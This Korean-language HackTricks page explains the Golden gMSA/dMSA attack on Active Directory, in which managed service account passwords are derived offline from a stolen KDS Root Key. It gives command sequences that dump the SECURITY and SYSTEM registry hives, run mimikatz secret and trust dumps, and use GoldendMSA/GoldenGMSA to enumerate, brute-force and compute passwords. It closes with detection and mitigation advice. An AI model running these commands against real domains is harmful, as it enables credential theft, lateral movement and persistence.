# Golden gMSA/dMSA Attack (Managed Service Account Passwords의 오프라인 도출)

{{#include ../../banners/hacktricks-training.md}}

## Overview

Windows Managed Service Account (MSA)는 비밀번호를 수동으로 관리하지 않고 서비스를 실행하도록 설계된 특수 principal입니다.
주요 유형은 다음 두 가지입니다.

1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` attribute에서 권한이 부여된 여러 host에서 사용할 수 있습니다.
2. **dMSA** – delegated Managed Service Account – gMSA의 (preview) 후속 유형으로, 동일한 cryptography를 사용하면서 더 세분화된 delegation 시나리오를 지원합니다.

두 유형 모두 **password가** 일반적인 NT-hash처럼 각 Domain Controller (DC)에 **저장되지 않습니다**. 대신 모든 DC는 다음 항목을 사용해 현재 password를 즉시 **derive**할 수 있습니다.

* forest 전체의 **KDS Root Key** (`KRBTGT\KDS`) – 무작위로 생성된 GUID 이름의 secret으로, `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container 아래 모든 DC에 replicate됩니다.
* 대상 account의 **SID**
* `msDS-ManagedPasswordId` attribute에서 확인할 수 있는 account별 **ManagedPasswordID** (GUID)

도출 과정은 다음과 같습니다: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob이 최종적으로 **base64-encoded**되어 `msDS-ManagedPassword` attribute에 저장됩니다.
일반적인 password 사용 중에는 Kerberos traffic이나 domain interaction이 필요하지 않습니다. member host는 세 가지 input을 알고 있는 한 password를 로컬에서 derive할 수 있습니다.

## Golden gMSA / Golden dMSA Attack

공격자가 세 가지 input을 모두 **offline**으로 획득하면 DC에 다시 접근하지 않고도 **forest 내 모든 gMSA/dMSA의 현재 및 미래 password**를 계산할 수 있으며, 다음을 우회할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals (미리 계산 가능)

이는 service account를 대상으로 하는 *Golden Ticket*과 유사합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisites

1. **하나의 DC에 대한 forest-level compromise** (또는 Enterprise Admin), 또는 forest 내 DC 중 하나에 대한 `SYSTEM` access
2. Service account를 enumerate할 수 있는 권한 (LDAP read / RID brute-force)
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 또는 이에 준하는 code를 실행할 수 있는 .NET ≥ 4.7.2 x64 workstation

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

모든 DC에서 다음 방법으로 dump합니다 (Volume Shadow Copy / raw SAM+SECURITY hives 또는 remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey`(GUID name)로 표시된 base64 문자열은 이후 단계에서 필요합니다.<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – gMSA / dMSA objects 열거

최소한 `sAMAccountName`, `objectSid` 및 `msDS-ManagedPasswordId`를 가져옵니다:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)는 helper modes를 구현합니다:<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – ManagedPasswordID 추측 / 발견 (누락된 경우)

일부 deployment에서는 ACL로 보호된 read에서 `msDS-ManagedPasswordId`를 *제거*합니다.
GUID는 128비트이므로 naive bruteforce는 실행하기 어렵지만 다음과 같습니다.

1. 처음 **32비트 = 계정 생성 시점의 Unix epoch time**(분 단위 정밀도)입니다.
2. 그 뒤에 96개의 random bits가 이어집니다.

따라서 계정별로 **좁은 wordlist**(± 몇 시간)를 사용하는 것이 현실적입니다.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
이 도구는 후보 password를 계산한 후 해당 password의 base64 blob을 실제 `msDS-ManagedPassword` attribute와 비교합니다. 일치하는 결과를 통해 올바른 GUID를 확인할 수 있습니다.

##### Phase 4 – Offline Password Computation & Conversion

ManagedPasswordID를 확인했다면 유효한 password는 명령어 한 번으로 계산할 수 있습니다:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
생성된 해시는 **mimikatz**(`sekurlsa::pth`) 또는 Kerberos abuse를 위한 **Rubeus**로 주입할 수 있으며, 이를 통해 은밀한 **lateral movement**와 **persistence**가 가능합니다.

## 탐지 및 완화

* **DC backup 및 registry hive read** 기능을 Tier-0 관리자만 사용할 수 있도록 제한합니다.
* DC에서 **Directory Services Restore Mode (DSRM)** 또는 **Volume Shadow Copy** 생성 여부를 모니터링합니다.
* `CN=Master Root Keys,…`에 대한 읽기 / 변경과 service account의 `userAccountControl` 플래그를 감사(audit)합니다.
* 비정상적인 **base64 password writes** 또는 여러 호스트에서 갑작스럽게 발생하는 service password 재사용을 탐지합니다.
* Tier-0 격리가 불가능한 경우, 높은 권한을 가진 gMSA를 정기적으로 무작위 값을 변경하는 **classic service accounts**로 전환하는 것을 고려합니다.

## 도구

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – 이 페이지에서 사용된 reference implementation.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – 이 페이지에서 사용된 reference implementation.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – derived AES keys를 사용한 pass-the-ticket.

## 참고 자료

- [1] [Golden dMSA – delegated Managed Service Accounts를 위한 authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
